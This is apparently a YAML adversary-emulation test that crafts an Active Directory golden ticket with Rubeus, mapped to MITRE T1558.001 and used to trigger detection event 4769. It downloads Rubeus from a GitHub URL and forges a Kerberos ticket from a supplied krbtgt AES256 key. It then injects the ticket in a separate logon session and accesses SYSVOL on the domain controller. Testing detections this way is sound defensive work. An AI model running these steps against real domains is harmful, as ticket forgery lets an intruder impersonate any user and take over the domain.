api_version: "2.0"
name: Crafting Active Directory golden tickets with Rubeus
description: |
    Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.
    This test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).
    The generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.
args:
    - name: domaincontroller
      type: string
      default: $ENV:logonserver.TrimStart('\') + "." + "$ENV:userdnsdomain"
    - name: account
      type: string
      default: $ENV:username
    - name: krbtgt_aes256_key
      type: string
      default: b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
    - name: local_folder
      type: path
      default: $Env:temp
    - name: local_executable
      type: string
      default: rubeus.exe
    - name: rubeus_url
      type: string
      default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
uuid: e42d33cd-205c-4acf-ab59-a9f38f6bad9c
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1558: Steal or Forge Kerberos Tickets'
    subtechniques:
        - 'T1558.001: Golden Ticket'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        Computer must be domain joined
      inline: |
        if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {{Write-Host Joining this computer to a domain must be done manually
        }}
      executor: powershell
    - name: |
        Rubeus must exist
      inline: |
        if(Test-Path -Path #{local_folder}\#{local_executable}) {exit 0} else {{Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{local_folder}\#{local_executable}
        }}
      executor: powershell
    - name: crafting-active-directory-golden-tickets-with-rubeus
      inline: "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n\ncmd.exe /c \"{{.Args.local_folder}}\\{{.Args.local_executable}}\" golden /aes256:{{.Args.krbtgt_aes256_key}} /ldap /user:{{.Args.account}} /dc:$({{.Args.domaincontroller}}) /printcmd /outfile:golden\n$filename = (Get-ChildItem | ? {$_.Name.startswith(\"golden_\")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name\n\n# create batch file with commands to run in a separate \"runas /netonly\" session\n# so we don't purge Kerberos ticket from the current Windows session\n# its output goes to golden.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\n@\"\n>%TEMP%\\golden.txt 2>&1 (\n  echo Purge existing tickets and create golden ticket:\n  klist purge\n  cd %temp%\n  \"{{.Args.local_folder}}\\{{.Args.local_executable}}\" ptt /ticket:kirbifile\n\n  echo.\n  echo Requesting SYSVOL:\n  dir \\\\$({{.Args.domaincontroller}})\\SYSVOL\n  \n  echo.\n  echo Tickets after requesting SYSVOL:\n  klist\n\n  echo.\n  echo End of Golden Ticket attack\n)\n\"@ -Replace \"kirbifile\", $filename | Out-File -Encoding OEM $env:TEMP\\golden.bat\n\n# run batch file in a new empty session (password and username do not matter)\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null\n\n# wait until the output file has logged the entire attack\ndo {\n  Start-Sleep 1 # wait a bit so the output file has time to be created\n  Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {\n    if ($_ -match 'End of Golden Ticket attack') { break } \n  }\n} while ($false) # dummy loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content $env:TEMP\\golden.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n"
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
